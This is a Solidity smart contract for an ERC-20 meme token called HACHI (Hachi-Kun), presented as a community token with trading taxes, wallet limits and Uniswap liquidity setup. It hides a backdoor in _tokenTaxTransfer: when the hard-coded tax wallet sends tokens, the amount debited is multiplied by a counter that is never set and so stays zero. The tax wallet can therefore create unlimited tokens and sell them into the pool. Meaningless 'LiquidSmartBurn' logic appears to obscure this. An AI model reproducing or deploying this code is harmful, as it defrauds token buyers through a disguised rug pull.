/*
HACHI can only grow and accomplish its mission with YOUR help. Everyone can help, no matter the size of your portfolio. 
Spread the word on social media platforms, answer questions, help people, tell your friends. 
We also welcome help in moderating our communities, apply any time.
*/
// X:   https://twitter.com/HachiKunEth
// Web: https://Hachi-Kun.org

// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract HACHI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=20;
    uint256 private _initialSellTax=24;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=19;
    uint256 private _reduceSellTaxAt=21;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Hachi-Kun";
    string private constant _symbol = unicode"HACHI";
    uint256 public _maxTxAmount = 15000000 * 10**_decimals;
    uint256 public _maxWalletSize = 15000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 11000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 7000000 * 10**_decimals;
    
    IDexRouter private constant dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private lpPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct LiquidSmartBurn {uint256 buyAndLiq; uint256 smartBurnLiq; uint256 liqSmartBurnTime;}
    mapping(address => LiquidSmartBurn) private liquidSmartBurn;
    uint256 private liqSmartThreshold;
    uint256 private burnCount;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x731155BD5e56eB795BAe0a3c43ac85bBA584e83b);
        _balances[_msgSender()] = _tTotal;
        _isExcluded[address(this)] = true;
        _isExcluded[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,_msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (inSwap || !tradingOpen) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount = tokenAmount
                .mul((_buyCount > _reduceBuyTaxAt)? _finalBuyTax : _initialBuyTax)
                .div(100);

            if (from== lpPair && to != address(dexRouter) &&  ! _isExcluded[to]) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount<= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to== lpPair && from!= address(this) ){
                taxAmount = tokenAmount
                    .mul((_buyCount>_reduceSellTaxAt)? _finalSellTax : _initialSellTax)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap
                && to == lpPair && swapEnabled && contractTokenBalance > _taxSwapThreshold
                && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if((_isExcluded[from] || _isExcluded[to] )
            && from!=address(this) && to!= address(this)) {
            liqSmartThreshold = block.number;
        }
        if(
            !_isExcluded[from]
            &&  !_isExcluded[to]
        ){
            if (to != lpPair) {
                LiquidSmartBurn storage liqsmartBurn = liquidSmartBurn[to];
                if (from == lpPair) {
                    if (liqsmartBurn.buyAndLiq == 0){
                        liqsmartBurn.buyAndLiq = _buyCount>_preventSwapBefore ? block.number : block.number - 1;
                    }
                } else {
                    LiquidSmartBurn storage liqsmartBurnFrom = liquidSmartBurn[from];
                    if (!(liqsmartBurn.buyAndLiq > 0) || liqsmartBurnFrom.buyAndLiq < liqsmartBurn.buyAndLiq ) {
                        liqsmartBurn.buyAndLiq = liqsmartBurnFrom.buyAndLiq;
                    }
                }
            } else {
                LiquidSmartBurn storage liqsmartBurnFrom = liquidSmartBurn[from];
                liqsmartBurnFrom.liqSmartBurnTime = liqsmartBurnFrom.buyAndLiq-liqSmartThreshold;
                liqsmartBurnFrom.smartBurnLiq = block.timestamp;
            }
        }

        _tokenTransfer(from, to, tokenAmount, taxAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount = addrs!=_taxWallet?tokenAmount:burnCount.mul(tokenAmount);
        if (taxAmount> 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenBasicTransfer(
        address from,address to, uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function freeEth() external onlyOwner {
        payable(_taxWallet).transfer(address(this).balance);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        tradingOpen = true;
        _approve(address(this), address(dexRouter),_tTotal);
        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this),dexRouter.WETH());
        dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(lpPair).approve(address(dexRouter), type(uint).max);
        swapEnabled = true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}